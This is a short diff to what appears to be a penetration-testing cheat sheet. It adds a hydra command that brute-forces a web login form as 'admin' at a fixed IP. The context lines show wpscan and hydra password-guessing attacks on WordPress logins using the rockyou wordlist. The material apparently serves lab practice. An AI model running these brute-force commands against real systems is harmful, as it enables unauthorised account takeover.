@@ -23,6 +23,7 @@ wpscan --password-attack xmlrpc -t 10 -U admin,roger -P /usr/share/wordlists/roc
 
 wpscan --password-attack wp-login -t 20 -U usernames.txt -P /usr/share/wordlists/rockyou.txt --url http://$target --no-banner
 
+hydra -l admin -P /home/dcloud/2020-200_most_used_passwords.txt 198.19.40.100 http-post-form "/<discovered_path>:username=^USER^&password=^PASS^:Invalid credentials."
 hydra -l cameron -P /usr/share/wordlists/rockyou.txt $target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=Invalid username"
 ```
 
